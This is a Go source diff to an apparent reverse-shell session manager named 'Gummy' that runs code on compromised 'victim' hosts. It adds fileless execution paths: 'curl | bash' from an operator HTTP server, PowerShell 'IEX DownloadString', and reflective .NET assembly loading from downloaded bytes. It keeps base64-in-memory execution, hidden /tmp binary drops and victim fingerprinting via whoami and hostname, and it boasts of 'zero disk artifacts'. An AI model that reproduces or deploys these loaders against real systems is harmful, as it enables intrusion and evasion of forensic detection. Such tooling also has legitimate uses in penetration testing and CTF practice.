@@ -44,6 +44,7 @@ type SessionInfo struct {
 	Handler   *Handler  // Shell handler
 	Active    bool      // Se está sendo usada atualmente
 	CreatedAt time.Time // Timestamp de criação
+	LogFile   *os.File  // Session I/O log file (lazy init)
 }
 
 // Directory retorna o diretório base da sessão
@@ -69,6 +70,39 @@ func (s *SessionInfo) LogsDir() string {
 	dir := filepath.Join(s.Directory(), "logs")
 	os.MkdirAll(dir, 0755)
 	return dir
+}
+
+// InitLogFile initializes the session log file (lazy init on first shell interaction)
+func (s *SessionInfo) InitLogFile() error {
+	if s.LogFile != nil {
+		return nil // Already initialized
+	}
+
+	logPath := filepath.Join(s.LogsDir(), fmt.Sprintf("session_%d.log", s.NumID))
+
+	f, err := os.OpenFile(logPath, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
+	if err != nil {
+		return fmt.Errorf("failed to create log file: %w", err)
+	}
+
+	s.LogFile = f
+
+	// Write session header
+	header := fmt.Sprintf("=== Gummy Session Log ===\n"+
+		"Session ID: %d\n"+
+		"Remote IP:  %s\n"+
+		"Whoami:     %s\n"+
+		"Platform:   %s\n"+
+		"Started:    %s\n"+
+		"Log file:   %s\n"+
+		"===========================\n\n",
+		s.NumID, s.RemoteIP, s.Whoami, s.Platform,
+		s.CreatedAt.Format("2006-01-02 15:04:05"),
+		logPath)
+
+	f.WriteString(header)
+
+	return nil
 }
 
 // sanitizePath remove caracteres problemáticos do path
@@ -194,36 +228,75 @@ func (s *SessionInfo) RunScript(ctx context.Context, scriptSource string, args [
 // scriptSource: URL or local path to script file
 // args: arguments to pass to the script
 func (s *SessionInfo) RunScriptInMemory(ctx context.Context, scriptSource string, args []string) error {
-	// Download if URL
-	var scriptPath string
-	if strings.HasPrefix(scriptSource, "http://") || strings.HasPrefix(scriptSource, "https://") {
-		var cached bool
-		scriptPath, cached = s.getCachedFile(scriptSource)
-		if cached {
-			fmt.Println(ui.Info(fmt.Sprintf("Using cached %s", filepath.Base(scriptPath))))
-		} else {
-			if err := DownloadFile(ctx, scriptSource, scriptPath); err != nil {
-				return fmt.Errorf("download failed: %w", err)
+	// Resolve source: download URL to local, check binbag, etc.
+	t := NewTransferer(s.Conn, s.ID)
+	localPath, cleanup, err := t.resolveSource(scriptSource)
+	if err != nil {
+		// Fallback: try direct download to session cache
+		if strings.HasPrefix(scriptSource, "http://") || strings.HasPrefix(scriptSource, "https://") {
+			var cached bool
+			localPath, cached = s.getCachedFile(scriptSource)
+			if !cached {
+				if err := DownloadFile(ctx, scriptSource, localPath); err != nil {
+					return fmt.Errorf("download failed: %w", err)
+				}
+			} else {
+				fmt.Println(ui.Info(fmt.Sprintf("Using cached %s", filepath.Base(localPath))))
 			}
+		} else {
+			return fmt.Errorf("source not found: %w", err)
 		}
-	} else {
-		scriptPath = scriptSource
+	}
+	if cleanup != nil {
+		defer cleanup()
 	}
 
 	// Output file (named after script for easy identification)
-	outputPath := s.getOutputPath(scriptPath)
+	outputPath := s.getOutputPath(localPath)
 
 	// Create empty output file for tail -f
 	if err := os.WriteFile(outputPath, []byte{}, 0644); err != nil {
 		return fmt.Errorf("failed to create output file: %w", err)
 	}
 
-	// Generate unique variable name
+	// Try HTTP method first when binbag is enabled (curl | bash - blazing fast!)
+	if GlobalRuntimeConfig != nil && GlobalRuntimeConfig.BinbagEnabled {
+		filename := filepath.Base(localPath)
+		httpURL := GlobalRuntimeConfig.GetHTTPURL(filename)
+
+		// Build args
+		argsStr := ""
+		if len(args) > 0 {
+			argsStr = " -- " + strings.Join(args, " ")
+		}
+
+		// Open terminal for output
+		tailCmd := fmt.Sprintf("tail -f %s", outputPath)
+		if err := OpenTerminal(tailCmd); err != nil {
+			fmt.Println(ui.Warning(fmt.Sprintf("Could not open terminal: %v", err)))
+		}
+		time.Sleep(300 * time.Millisecond)
+
+		fmt.Println(ui.Info(fmt.Sprintf("Executing script (HTTP in-memory) and saving output to: %s", outputPath)))
+
+		go func() {
+			time.Sleep(200 * time.Millisecond)
+
+			// curl | bash - single HTTP request, zero disk artifacts, blazing fast
+			cmd := fmt.Sprintf("curl -s '%s' | bash -s%s", httpURL, argsStr)
+			if err := s.Handler.ExecuteWithStreaming(cmd, outputPath); err != nil {
+				fmt.Println(ui.Error(fmt.Sprintf("Execution error: %v", err)))
+			}
+		}()
+
+		return nil
+	}
+
+	// Fallback: b64 variable upload (works without binbag)
 	varName := fmt.Sprintf("_gummy_script_%d", time.Now().UnixNano())
 
 	// Upload script to bash variable (in-memory, no disk write)
-	t := NewTransferer(s.Conn, s.ID)
-	if err := t.UploadToBashVariable(context.Background(), scriptPath, varName); err != nil {
+	if err := t.UploadToBashVariable(context.Background(), localPath, varName); err != nil {
 		return fmt.Errorf("upload to memory failed: %w", err)
 	}
 
@@ -250,7 +323,6 @@ func (s *SessionInfo) RunScriptInMemory(ctx context.Context, scriptSource string
 		time.Sleep(200 * time.Millisecond)
 
 		// Execute from variable: decode base64 and pipe to bash
-		// The variable contains base64-encoded script, so we decode and execute
 		cmd := fmt.Sprintf("echo \"$%s\" | base64 -d | bash -s%s", varName, argsStr)
 		if err := s.Handler.ExecuteWithStreaming(cmd, outputPath); err != nil {
 			fmt.Println(ui.Error(fmt.Sprintf("Execution error: %v", err)))
@@ -267,34 +339,40 @@ func (s *SessionInfo) RunScriptInMemory(ctx context.Context, scriptSource string
 // RunBinary downloads (if URL), uploads to victim, makes executable, runs
 // Same as RunScript but for binary executables (no bash interpreter)
 func (s *SessionInfo) RunBinary(ctx context.Context, binarySource string, args []string) error {
-	// Download if URL
-	var binaryPath string
-	if strings.HasPrefix(binarySource, "http://") || strings.HasPrefix(binarySource, "https://") {
-		var cached bool
-		binaryPath, cached = s.getCachedFile(binarySource)
-		if cached {
-			fmt.Println(ui.Info(fmt.Sprintf("Using cached %s", filepath.Base(binaryPath))))
-		} else {
-			if err := DownloadFile(ctx, binarySource, binaryPath); err != nil {
-				return fmt.Errorf("download failed: %w", err)
+	// Resolve source: download URL to local, check binbag, etc.
+	t := NewTransferer(s.Conn, s.ID)
+	localPath, cleanup, err := t.resolveSource(binarySource)
+	if err != nil {
+		// Fallback: try direct download to session cache
+		if strings.HasPrefix(binarySource, "http://") || strings.HasPrefix(binarySource, "https://") {
+			var cached bool
+			localPath, cached = s.getCachedFile(binarySource)
+			if !cached {
+				if err := DownloadFile(ctx, binarySource, localPath); err != nil {
+					return fmt.Errorf("download failed: %w", err)
+				}
+			} else {
+				fmt.Println(ui.Info(fmt.Sprintf("Using cached %s", filepath.Base(localPath))))
 			}
+		} else {
+			return fmt.Errorf("source not found: %w", err)
 		}
-	} else {
-		binaryPath = binarySource
+	}
+	if cleanup != nil {
+		defer cleanup()
 	}
 
 	// Output file (named after script for easy identification)
-	outputPath := s.getOutputPath(binaryPath)
+	outputPath := s.getOutputPath(localPath)
 
 	// Create empty output file for tail -f
 	if err := os.WriteFile(outputPath, []byte{}, 0644); err != nil {
 		return fmt.Errorf("failed to create output file: %w", err)
 	}
 
-	// Upload binary
+	// Upload binary using SmartUpload (HTTP if binbag enabled, b64 fallback)
 	remotePath := fmt.Sprintf("/tmp/.gummy_%d", time.Now().UnixNano())
-	t := NewTransferer(s.Conn, s.ID)
-	if err := t.Upload(context.Background(), binaryPath, remotePath); err != nil {
+	if err := t.SmartUpload(context.Background(), localPath, remotePath); err != nil {
 		return fmt.Errorf("upload failed: %w", err)
 	}
 
@@ -347,37 +425,74 @@ func (s *SessionInfo) RunBinary(ctx context.Context, binarySource string, args [
 // RunPowerShellInMemory executes PowerShell scripts in-memory (Windows, zero disk writes)
 // Similar to RunScriptInMemory but for PowerShell on Windows
 func (s *SessionInfo) RunPowerShellInMemory(ctx context.Context, scriptSource string, args []string) error {
-	// Download if URL
-	var scriptPath string
-	if strings.HasPrefix(scriptSource, "http://") || strings.HasPrefix(scriptSource, "https://") {
-		var cached bool
-		scriptPath, cached = s.getCachedFile(scriptSource)
-		if cached {
-			fmt.Println(ui.Info(fmt.Sprintf("Using cached %s", filepath.Base(scriptPath))))
-		} else {
-			if err := DownloadFile(ctx, scriptSource, scriptPath); err != nil {
-				return fmt.Errorf("download failed: %w", err)
+	// Resolve source
+	t := NewTransferer(s.Conn, s.ID)
+	t.SetPlatform(s.Platform)
+	localPath, cleanup, err := t.resolveSource(scriptSource)
+	if err != nil {
+		if strings.HasPrefix(scriptSource, "http://") || strings.HasPrefix(scriptSource, "https://") {
+			var cached bool
+			localPath, cached = s.getCachedFile(scriptSource)
+			if !cached {
+				if err := DownloadFile(ctx, scriptSource, localPath); err != nil {
+					return fmt.Errorf("download failed: %w", err)
+				}
+			} else {
+				fmt.Println(ui.Info(fmt.Sprintf("Using cached %s", filepath.Base(localPath))))
 			}
+		} else {
+			return fmt.Errorf("source not found: %w", err)
 		}
-	} else {
-		scriptPath = scriptSource
+	}
+	if cleanup != nil {
+		defer cleanup()
 	}
 
 	// Output file (named after script for easy identification)
-	outputPath := s.getOutputPath(scriptPath)
+	outputPath := s.getOutputPath(localPath)
 
 	// Create empty output file for tail -f
 	if err := os.WriteFile(outputPath, []byte{}, 0644); err != nil {
 		return fmt.Errorf("failed to create output file: %w", err)
 	}
 
-	// Generate unique variable name
+	// Build args (PowerShell style)
+	argsStr := ""
+	if len(args) > 0 {
+		argsStr = " " + strings.Join(args, " ")
+	}
+
+	// Try HTTP method first when binbag is enabled (IEX DownloadString - blazing fast!)
+	if GlobalRuntimeConfig != nil && GlobalRuntimeConfig.BinbagEnabled {
+		filename := filepath.Base(localPath)
+		httpURL := GlobalRuntimeConfig.GetHTTPURL(filename)
+
+		// Open terminal for output
+		tailCmd := fmt.Sprintf("tail -f %s", outputPath)
+		if err := OpenTerminal(tailCmd); err != nil {
+			fmt.Println(ui.Warning(fmt.Sprintf("Could not open terminal: %v", err)))
+		}
+		time.Sleep(300 * time.Millisecond)
+
+		fmt.Println(ui.Info(fmt.Sprintf("Executing PowerShell script (HTTP in-memory) and saving output to: %s", outputPath)))
+
+		go func() {
+			time.Sleep(200 * time.Millisecond)
+
+			// IEX (Invoke-Expression) with DownloadString - single HTTP request
+			cmd := fmt.Sprintf("IEX (New-Object Net.WebClient).DownloadString('%s')%s\r\n", httpURL, argsStr)
+			if err := s.Handler.ExecuteWithStreaming(cmd, outputPath); err != nil {
+				fmt.Println(ui.Error(fmt.Sprintf("Execution error: %v", err)))
+			}
+		}()
+
+		return nil
+	}
+
+	// Fallback: b64 variable upload (works without binbag)
 	varName := fmt.Sprintf("gummy_ps_%d", time.Now().UnixNano())
 
-	// Upload script to PowerShell variable (in-memory, no disk write)
-	t := NewTransferer(s.Conn, s.ID)
-	t.SetPlatform(s.Platform)
-	if err := t.UploadToPowerShellVariable(ctx, scriptPath, varName); err != nil {
+	if err := t.UploadToPowerShellVariable(ctx, localPath, varName); err != nil {
 		return fmt.Errorf("upload to memory failed: %w", err)
 	}
 
@@ -390,26 +505,15 @@ func (s *SessionInfo) RunPowerShellInMemory(ctx context.Context, scriptSource st
 
 	time.Sleep(300 * time.Millisecond)
 
-	// Build args (PowerShell style)
-	argsStr := ""
-	if len(args) > 0 {
-		argsStr = " " + strings.Join(args, " ")
-	}
-
-	// Show execution message with output path
 	fmt.Println(ui.Info(fmt.Sprintf("Executing PowerShell script (in-memory) and saving output to: %s", outputPath)))
 
 	go func() {
-		// Small delay to ensure variable is fully loaded
-		time.Sleep(500 * time.Millisecond) // Increased for PowerShell
+		time.Sleep(500 * time.Millisecond)
 
-		// Debug: Check if variable exists and has content
 		debugCmd := fmt.Sprintf("if ($%s) { Write-Host 'Variable loaded: yes' } else { Write-Host 'Variable loaded: no' }\r\n", varName)
 		s.Handler.SendCommand(debugCmd)
 		time.Sleep(200 * time.Millisecond)
 
-		// Execute from variable: decode base64 and invoke
-		// PowerShell syntax: decode UTF8 string from base64, then Invoke-Expression
 		cmd := fmt.Sprintf("$decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($%s)); Invoke-Expression \"$decoded%s\"; Remove-Variable -Name %s\r\n", varName, argsStr, varName)
 		if err := s.Handler.ExecuteWithStreaming(cmd, outputPath); err != nil {
 			fmt.Println(ui.Error(fmt.Sprintf("Execution error: %v", err)))
@@ -423,37 +527,111 @@ func (s *SessionInfo) RunPowerShellInMemory(ctx context.Context, scriptSource st
 // RunDotNetInMemory executes .NET assemblies in-memory (Windows, zero disk writes)
 // Uses reflection to load and execute assembly from memory
 func (s *SessionInfo) RunDotNetInMemory(ctx context.Context, assemblySource string, args []string) error {
-	// Download if URL
-	var assemblyPath string
-	if strings.HasPrefix(assemblySource, "http://") || strings.HasPrefix(assemblySource, "https://") {
-		var cached bool
-		assemblyPath, cached = s.getCachedFile(assemblySource)
-		if cached {
-			fmt.Println(ui.Info(fmt.Sprintf("Using cached %s", filepath.Base(assemblyPath))))
-		} else {
-			if err := DownloadFile(ctx, assemblySource, assemblyPath); err != nil {
-				return fmt.Errorf("download failed: %w", err)
+	// Resolve source
+	t := NewTransferer(s.Conn, s.ID)
+	t.SetPlatform(s.Platform)
+	localPath, cleanup, err := t.resolveSource(assemblySource)
+	if err != nil {
+		if strings.HasPrefix(assemblySource, "http://") || strings.HasPrefix(assemblySource, "https://") {
+			var cached bool
+			localPath, cached = s.getCachedFile(assemblySource)
+			if !cached {
+				if err := DownloadFile(ctx, assemblySource, localPath); err != nil {
+					return fmt.Errorf("download failed: %w", err)
+				}
+			} else {
+				fmt.Println(ui.Info(fmt.Sprintf("Using cached %s", filepath.Base(localPath))))
 			}
+		} else {
+			return fmt.Errorf("source not found: %w", err)
 		}
-	} else {
-		assemblyPath = assemblySource
+	}
+	if cleanup != nil {
+		defer cleanup()
 	}
 
 	// Output file (named after script for easy identification)
-	outputPath := s.getOutputPath(assemblyPath)
+	outputPath := s.getOutputPath(localPath)
 
 	// Create empty output file for tail -f
 	if err := os.WriteFile(outputPath, []byte{}, 0644); err != nil {
 		return fmt.Errorf("failed to create output file: %w", err)
 	}
 
-	// Generate unique variable name
+	// Build args (PowerShell array syntax)
+	argsStr := ""
+	if len(args) > 0 {
+		quotedArgs := make([]string, len(args))
+		for i, arg := range args {
+			quotedArgs[i] = fmt.Sprintf("'%s'", strings.ReplaceAll(arg, "'", "''"))
+		}
+		argsStr = "@(" + strings.Join(quotedArgs, ", ") + ")"
+	} else {
+		argsStr = "@()"
+	}
+
+	// Try HTTP method first when binbag is enabled (DownloadData + Reflection.Load - blazing fast!)
+	if GlobalRuntimeConfig != nil && GlobalRuntimeConfig.BinbagEnabled {
+		filename := filepath.Base(localPath)
+		httpURL := GlobalRuntimeConfig.GetHTTPURL(filename)
+
+		// Open terminal for output
+		tailCmd := fmt.Sprintf("tail -f %s", outputPath)
+		if err := OpenTerminal(tailCmd); err != nil {
+			fmt.Println(ui.Warning(fmt.Sprintf("Could not open terminal: %v", err)))
+		}
+		time.Sleep(300 * time.Millisecond)
+
+		fmt.Println(ui.Info(fmt.Sprintf("Executing .NET assembly (HTTP in-memory) and saving output to: %s", outputPath)))
+
+		go func() {
+			time.Sleep(200 * time.Millisecond)
+
+			// Download bytes directly via HTTP + Reflection.Assembly.Load - single request!
+			cmd := fmt.Sprintf(`
+try {
+    $bytes = (New-Object Net.WebClient).DownloadData('%s')
+    $assembly = [System.Reflection.Assembly]::Load($bytes)
+    $entryPoint = $assembly.EntryPoint
+    if ($entryPoint -ne $null) {
+        $output = & {
+            $oldOut = [Console]::Out
+            $oldErr = [Console]::Error
+            $sw = New-Object System.IO.StringWriter
+            [Console]::SetOut($sw)
+            [Console]::SetError($sw)
+            try {
+                $params = @(,[string[]]%s)
+                $entryPoint.Invoke($null, $params) | Out-Null
+            } finally {
+                [Console]::SetOut($oldOut)
+                [Console]::SetError($oldErr)
+                $result = $sw.ToString()
+                $sw.Dispose()
+                $result
+            }
+        }
+        Write-Output $output
+    } else {
+        Write-Host 'ERROR: No entry point found in assembly'
+    }
+} catch {
+    Write-Host "ERROR: $_"
+}
+`, httpURL, argsStr)
+
+			if err := s.Handler.ExecuteWithStreaming(cmd+"\r\n", outputPath); err != nil {
+				fmt.Println(ui.Error(fmt.Sprintf("Execution error: %v", err)))
+			}
+		}()
+
+		return nil
+	}
+
+	// Fallback: b64 variable upload (works without binbag)
 	varName := fmt.Sprintf("gummy_asm_%d", time.Now().UnixNano())
 
-	// Upload assembly to PowerShell variable (in-memory, no disk write)
-	t := NewTransferer(s.Conn, s.ID)
-	t.SetPlatform(s.Platform)
-	if err := t.UploadToPowerShellVariable(ctx, assemblyPath, varName); err != nil {
+	if err := t.UploadToPowerShellVariable(ctx, localPath, varName); err != nil {
 		return fmt.Errorf("upload to memory failed: %w", err)
 	}
 
@@ -466,37 +644,17 @@ func (s *SessionInfo) RunDotNetInMemory(ctx context.Context, assemblySource stri
 
 	time.Sleep(300 * time.Millisecond)
 
-	// Build args (PowerShell array syntax)
-	argsStr := ""
-	if len(args) > 0 {
-		// Convert to PowerShell array: @('arg1', 'arg2')
-		quotedArgs := make([]string, len(args))
-		for i, arg := range args {
-			quotedArgs[i] = fmt.Sprintf("'%s'", strings.ReplaceAll(arg, "'", "''"))
-		}
-		argsStr = "@(" + strings.Join(quotedArgs, ", ") + ")"
-	} else {
-		argsStr = "@()"
-	}
-
-	// Show execution message with output path
 	fmt.Println(ui.Info(fmt.Sprintf("Executing .NET assembly (in-memory) and saving output to: %s", outputPath)))
 
 	go func() {
-		// Small delay to ensure variable is fully loaded
 		time.Sleep(200 * time.Millisecond)
 
-		// Execute assembly via reflection
-		// 1. Decode base64 to bytes
-		// 2. Load assembly with [Reflection.Assembly]::Load()
-		// 3. Find and invoke entry point
 		cmd := fmt.Sprintf(`
 try {
     $bytes = [System.Convert]::FromBase64String($%s)
     $assembly = [System.Reflection.Assembly]::Load($bytes)
     $entryPoint = $assembly.EntryPoint
     if ($entryPoint -ne $null) {
-        # Capture both stdout and stderr
         $output = & {
             $oldOut = [Console]::Out
             $oldErr = [Console]::Error
@@ -537,37 +695,47 @@ Remove-Variable -Name %s -ErrorAction SilentlyContinue
 // RunPythonInMemory executes Python scripts in-memory (Linux/Windows, zero disk writes)
 // Similar to RunScriptInMemory but for Python
 func (s *SessionInfo) RunPythonInMemory(ctx context.Context, scriptSource string, args []string) error {
-	// Download if URL
-	var scriptPath string
-	if strings.HasPrefix(scriptSource, "http://") || strings.HasPrefix(scriptSource, "https://") {
-		var cached bool
-		scriptPath, cached = s.getCachedFile(scriptSource)
-		if cached {
-			fmt.Println(ui.Info(fmt.Sprintf("Using cached %s", filepath.Base(scriptPath))))
-		} else {
-			if err := DownloadFile(ctx, scriptSource, scriptPath); err != nil {
-				return fmt.Errorf("download failed: %w", err)
+	// Resolve source
+	t := NewTransferer(s.Conn, s.ID)
+	t.SetPlatform(s.Platform)
+	localPath, cleanup, err := t.resolveSource(scriptSource)
+	if err != nil {
+		if strings.HasPrefix(scriptSource, "http://") || strings.HasPrefix(scriptSource, "https://") {
+			var cached bool
+			localPath, cached = s.getCachedFile(scriptSource)
+			if !cached {
+				if err := DownloadFile(ctx, scriptSource, localPath); err != nil {
+					return fmt.Errorf("download failed: %w", err)
+				}
+			} else {
+				fmt.Println(ui.Info(fmt.Sprintf("Using cached %s", filepath.Base(localPath))))
 			}
+		} else {
+			return fmt.Errorf("source not found: %w", err)
 		}
-	} else {
-		scriptPath = scriptSource
+	}
+	if cleanup != nil {
+		defer cleanup()
 	}
 
 	// Output file (named after script for easy identification)
-	outputPath := s.getOutputPath(scriptPath)
+	outputPath := s.getOutputPath(localPath)
 
 	// Create empty output file for tail -f
 	if err := os.WriteFile(outputPath, []byte{}, 0644); err != nil {
 		return fmt.Errorf("failed to create output file: %w", err)
 	}
 
-	// Generate unique variable name
+	// Build args (Python sys.argv style)
+	argsStr := ""
+	if len(args) > 0 {
+		argsStr = " " + strings.Join(args, " ")
+	}
+
+	// Fallback: b64 variable upload (works without binbag)
 	varName := fmt.Sprintf("_gummy_py_%d", time.Now().UnixNano())
 
-	// Upload script to Python variable (in-memory, no disk write)
-	t := NewTransferer(s.Conn, s.ID)
-	t.SetPlatform(s.Platform)
-	if err := t.UploadToPythonVariable(ctx, scriptPath, varName); err != nil {
+	if err := t.UploadToPythonVariable(ctx, localPath, varName); err != nil {
 		return fmt.Errorf("upload to memory failed: %w", err)
 	}
 
@@ -580,21 +748,11 @@ func (s *SessionInfo) RunPythonInMemory(ctx context.Context, scriptSource string
 
 	time.Sleep(300 * time.Millisecond)
 
-	// Build args (Python sys.argv style)
-	argsStr := ""
-	if len(args) > 0 {
-		argsStr = " " + strings.Join(args, " ")
-	}
-
-	// Show execution message with output path
 	fmt.Println(ui.Info(fmt.Sprintf("Executing Python script (in-memory) and saving output to: %s", outputPath)))
 
 	go func() {
-		// Small delay to ensure variable is fully loaded
 		time.Sleep(200 * time.Millisecond)
 
-		// Execute from variable: decode base64 and exec
-		// Python syntax: decode base64 string, then exec()
 		cmd := fmt.Sprintf("python3 -c \"import base64; exec(base64.b64decode(%s).decode('utf-8'))\" %s; unset %s\n", varName, argsStr, varName)
 		if err := s.Handler.ExecuteWithStreaming(cmd, outputPath); err != nil {
 			fmt.Println(ui.Error(fmt.Sprintf("Execution error: %v", err)))
@@ -908,6 +1066,13 @@ func (m *Manager) RemoveSession(id string) {
 
 	fmt.Println(ui.SessionClosed(session.NumID, session.RemoteIP))
 
+	// Close log file if open
+	if session.LogFile != nil {
+		session.LogFile.WriteString(fmt.Sprintf("\n--- Session %d closed at %s ---\n", session.NumID, time.Now().Format("2006-01-02 15:04:05")))
+		session.LogFile.Close()
+		session.LogFile = nil
+	}
+
 	// Se era a sessão selecionada, limpar seleção
 	if m.selectedSession != nil && m.selectedSession.ID == id {
 		m.selectedSession = nil
@@ -1018,6 +1183,13 @@ func (m *Manager) KillSession(numID int) error {
 		return fmt.Errorf("session %d not found", numID)
 	}
 
+	// Close log file if open
+	if targetSession.LogFile != nil {
+		targetSession.LogFile.WriteString(fmt.Sprintf("\n--- Session %d killed at %s ---\n", targetSession.NumID, time.Now().Format("2006-01-02 15:04:05")))
+		targetSession.LogFile.Close()
+		targetSession.LogFile = nil
+	}
+
 	// Fecha a conexão
 	targetSession.Conn.Close()
 
@@ -1124,7 +1296,7 @@ func (m *Manager) detectSessionInfo(session *SessionInfo) {
 	// Aguarda shell enviar algo
 	time.Sleep(500 * time.Millisecond)
 
-	// Lê o que tiver disponível (reduzido de 10 para 5 tentativas)
+	// Phase 1: Read initial prompt to detect platform
 	initialPrompt := ""
 	buffer := make([]byte, 4096)
 
@@ -1148,30 +1320,30 @@ func (m *Manager) detectSessionInfo(session *SessionInfo) {
 		time.Sleep(150 * time.Millisecond)
 	}
 
-
-	// Detecta platform baseado no prompt recebido (inspirado no Penelope)
-	// IMPORTANTE: Prompt pode estar vazio! Algumas shells não enviam nada até receber comando.
+	// Detect platform from initial prompt
 	detectedPlatform := "unknown"
 
-	// PowerShell prompts: "PS C:\>" ou "PS >"
 	if strings.Contains(initialPrompt, "PS ") && strings.Contains(initialPrompt, ">") {
 		detectedPlatform = "windows"
 	} else if strings.Contains(initialPrompt, "Microsoft Windows") {
-		// Banner do cmd.exe
 		detectedPlatform = "windows"
 	} else if strings.Contains(initialPrompt, "C:\\") || strings.Contains(initialPrompt, "C:/") {
-		// Prompt do cmd.exe
 		detectedPlatform = "windows"
 	} else if strings.Contains(initialPrompt, "$") || strings.Contains(initialPrompt, "#") {
-		// Unix shells (bash, sh, etc.)
 		detectedPlatform = "linux"
-	} else {
 	}
 
 	session.Platform = detectedPlatform
 
-	// Envia comando universal que funciona em ambos (Linux vai executar, Windows vai mostrar prompt)
-	detectionCmd := "echo $(whoami 2>/dev/null)@$(hostname 2>/dev/null)\n"
+	// Phase 2: Send platform-specific detection commands
+	var detectionCmd string
+	if detectedPlatform == "windows" {
+		// Windows: send whoami and hostname as separate commands
+		detectionCmd = "whoami\r\nhostname\r\n"
+	} else {
+		// Linux/unknown: bash-compatible command
+		detectionCmd = "echo $(whoami 2>/dev/null)@$(hostname 2>/dev/null)\n"
+	}
 
 	_, err := session.Conn.Write([]byte(detectionCmd))
 	if err != nil {
@@ -1179,90 +1351,64 @@ func (m *Manager) detectSessionInfo(session *SessionInfo) {
 		return
 	}
 
-	// Aguarda execução - shells remotas podem ser lentas (HTB, VPN, etc.)
+	// Wait for execution
 	time.Sleep(1000 * time.Millisecond)
 
-	// Lê toda a resposta em múltiplas tentativas com timeout adaptativo
+	// Phase 3: Parse response
 	allData := ""
 	readBuffer := make([]byte, 2048)
 	foundWhoami := false
-	foundPlatform := false
-	windowsUser := ""     // Para Windows: armazena DOMAIN\user
-	windowsHostname := "" // Para Windows: armazena hostname
+	foundPlatform := detectedPlatform != "unknown"
+	windowsUser := ""
+	windowsHostname := ""
 
-	// IMPORTANTE: verifica se já detectamos platform pelo prompt inicial
-	if detectedPlatform != "unknown" {
-		foundPlatform = true
-	}
-
-	// 10 tentativas com timeout de 1s cada = até 10 segundos para shells lentas
 	for i := 0; i < 10; i++ {
-		// Timeout de 1s por tentativa (HTB pode ser lento!)
 		session.Conn.SetReadDeadline(time.Now().Add(1000 * time.Millisecond))
 		n, err := session.Conn.Read(readBuffer)
 
 		if err != nil {
-			// Se é timeout mas já encontramos tudo, pode sair IMEDIATAMENTE
 			if foundWhoami && foundPlatform {
 				break
 			}
-			// Se é timeout mas já lemos algo, continua tentando (até 5 retries)
 			if len(allData) > 0 && i < 5 {
 				time.Sleep(200 * time.Millisecond)
 				continue
 			}
-			// Timeout sem dados = desistir
-			if len(allData) == 0 {
-				break
-			}
-			// Timeout com dados mas já tentou muito = desistir
 			break
 		}
 
 		chunk := string(readBuffer[:n])
 		allData += chunk
 
-		// Processa os dados recebidos (pode ou não ter line endings)
-		// Normaliza line endings
+		// Normalize line endings
 		normalized := strings.ReplaceAll(allData, "\r\n", "\n")
 		normalized = strings.ReplaceAll(normalized, "\r", "\n")
 
-		// Se tem quebras de linha, split normal. Senão, trata como linha única
 		var lines []string
 		if strings.Contains(normalized, "\n") {
 			lines = strings.Split(normalized, "\n")
 		} else {
-			// Sem line ending - trata dados completos como uma linha
 			lines = []string{normalized}
 		}
 
 		for _, line := range lines {
 			line = strings.TrimSpace(line)
-			if len(line) > 0 {
-			}
 
-			// Detecta plataforma PRIMEIRO (importante para shells silenciosas)
-			// Se vemos um prompt PowerShell na resposta, é Windows!
+			// Platform detection from response (for shells that didn't show prompt initially)
 			if !foundPlatform {
 				if strings.Contains(line, "PS ") && strings.Contains(line, ">") && strings.Contains(line, ":\\") {
-					// Prompt PowerShell: "PS C:\Users\...\Documents> "
-					session.Platform = "windows"
-					foundPlatform = true
-					detectedPlatform = "windows" // Atualiza para parsing de whoami
-
-					// Agora que sabemos que é Windows, envia whoami e hostname
-					session.Conn.Write([]byte("whoami; hostname\r\n"))
-				} else if strings.Contains(line, "C:\\") && strings.Contains(line, ">") {
-					// Prompt cmd.exe
 					session.Platform = "windows"
 					foundPlatform = true
 					detectedPlatform = "windows"
-
-					// Envia whoami e hostname para Windows
-					session.Conn.Write([]byte("whoami && hostname\r\n"))
+					// Send Windows-specific commands now
+					session.Conn.Write([]byte("whoami\r\nhostname\r\n"))
+				} else if strings.Contains(line, "C:\\") && strings.Contains(line, ">") {
+					session.Platform = "windows"
+					foundPlatform = true
+					detectedPlatform = "windows"
+					session.Conn.Write([]byte("whoami\r\nhostname\r\n"))
 				}
 
-				// Detecção tradicional por keywords
 				lowerLine := strings.ToLower(line)
 				if strings.Contains(lowerLine, "linux") {
 					session.Platform = "linux"
@@ -1279,22 +1425,20 @@ func (m *Manager) detectSessionInfo(session *SessionInfo) {
 				}
 			}
 
-			// Para Windows, procura formato "DOMAIN\user" E hostname separadamente
+			// Windows whoami parsing: DOMAIN\user and hostname
 			if detectedPlatform == "windows" {
-				// 1. Captura DOMAIN\user do whoami
+				// 1. Capture DOMAIN\user from whoami output
 				if windowsUser == "" && strings.Contains(line, "\\") {
-					// Caso especial: whoami grudado no prompt "PS C:\...\Documents> htb\svc-alfresco"
-					// Extrai a parte depois do último ">" se existir
+					// Extract part after last ">" if prompt is concatenated
 					extracted := line
 					if strings.Contains(line, ">") {
 						parts := strings.Split(line, ">")
 						if len(parts) > 1 {
-							// Pega a última parte depois do ">"
 							extracted = strings.TrimSpace(parts[len(parts)-1])
 						}
 					}
 
-					// Valida o whoami extraído
+					// Validate the whoami output
 					if strings.Contains(extracted, "\\") &&
 						!strings.Contains(extracted, "whoami") &&
 						!strings.Contains(extracted, "hostname") &&
@@ -1302,16 +1446,14 @@ func (m *Manager) detectSessionInfo(session *SessionInfo) {
 						!strings.Contains(extracted, ">") &&
 						len(extracted) > 3 && len(extracted) < 50 {
 
-						// Valida formato: palavra\palavra
 						parts := strings.Split(extracted, "\\")
 						if len(parts) == 2 && len(parts[0]) > 0 && len(parts[1]) > 0 {
-							// Extrai apenas o username (depois do \)
 							windowsUser = parts[1]
 						}
 					}
 				}
 
-				// 2. Captura hostname (linha simples, não tem \, não tem prompt)
+				// 2. Capture hostname (clean line, no special chars)
 				if windowsHostname == "" &&
 					!strings.Contains(line, "\\") &&
 					!strings.Contains(line, ">") &&
@@ -1319,15 +1461,15 @@ func (m *Manager) detectSessionInfo(session *SessionInfo) {
 					!strings.Contains(line, "hostname") &&
 					!strings.Contains(line, "PS ") &&
 					!strings.Contains(line, "C:") &&
+					!strings.Contains(line, "echo") &&
 					len(strings.TrimSpace(line)) > 0 &&
 					len(strings.TrimSpace(line)) < 50 {
 
-					// Valida que é um hostname válido (alfanumérico, hífen, underscore)
 					cleaned := strings.TrimSpace(line)
 					isValidHostname := true
 					for _, c := range cleaned {
